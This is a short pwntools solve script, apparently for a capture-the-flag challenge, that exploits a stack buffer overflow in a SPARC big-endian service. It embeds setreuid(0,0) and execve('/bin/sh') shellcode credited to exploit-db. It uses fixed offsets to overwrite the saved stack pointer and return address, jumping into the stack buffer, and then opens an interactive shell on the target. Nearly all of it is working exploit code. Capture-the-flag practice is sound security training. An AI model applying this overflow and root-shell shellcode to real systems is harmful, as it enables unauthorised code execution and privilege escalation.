#!/usr/bin/env python3

"""
Run against remote with:
./solve.py HOST=flu.xxx PORT=2025
"""

from pwn import *


def init_pwntools_context():
    context.arch = "sparc"
    context.endian = "big"
    context.log_level = "debug"


def init_io():
    return remote(args["HOST"], int(args["PORT"]))


class Offsets:
    sp_overwrite = 184
    o7_overwrite = 188

    input_len = 0x200


class Gadgets:
    buf_global = 0x30674

    stack_buf = 0xffffea68


def win(io):
    input("PAUSED...")

    # Shellcode from https://www.exploit-db.com/papers/13218
    sc = b""
    sc += b"A"*1  # dummy so start of shellcode is aligned
    sc += b"\x01\x00\x00\x00"  # nop
    sc += b"\x01\x00\x00\x00"  # nop
    sc += b"\x01\x00\x00\x00"  # nop
    sc += b"\x90\x1A\x40\x09"  # xor %o1, %o1, %o0
    sc += b"\x92\x1A\x40\x09"  # xor %o1, %o1, %o1
    sc += b"\x82\x10\x20\xCA"  # mov SYS_SETREUID(202), %g1
    sc += b"\x91\xD0\x20\x08"  # ta KERNEL(0x08)
    sc += b"\x21\x0B\xD8\x9A"  # sethi %hi(0x2f626900), %l0
    sc += b"\xA0\x14\x21\x6E"  # or %l0, %lo(0x16e), %l0
    sc += b"\x23\x0B\xDC\xDA"  # sethi %hi(0x2f736800), %l1
    sc += b"\xE0\x3B\xBF\xF0"  # std %l0, [%sp - 0x10]
    sc += b"\x90\x23\xA0\x10"  # sub %sp, 0x10, %o0
    sc += b"\xD0\x23\xBF\xF8"  # st  %o0, [%sp - 0x8]
    sc += b"\x92\x23\xA0\x08"  # sub %sp, 0x8, %o1
    sc += b"\x94\x1A\x80\x0A"  # xor %o2, %o2, %o2
    sc += b"\x82\x10\x20\x3B"  # mov SYS_EXECVE(59), %g1
    sc += b"\x91\xD0\x20\x08"  # ta KERNEL(0x08)

    overflow = b""
    overflow += sc

    assert len(overflow) <= Offsets.sp_overwrite
    overflow += b"A" * (Offsets.sp_overwrite - len(overflow))

    overflow += p32(Gadgets.stack_buf - 0x20)
    overflow += p32(Gadgets.stack_buf)

    payload = b""
    payload += b"2"
    payload += b"1"*7
    payload += b"3"*5
    payload += b"4"

    payload += p8(len(overflow))
    payload += overflow

    assert len(payload) <= Offsets.input_len
    payload += b"B" * (Offsets.input_len - len(payload))

    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    init_pwntools_context()
    io = init_io()
    win(io)
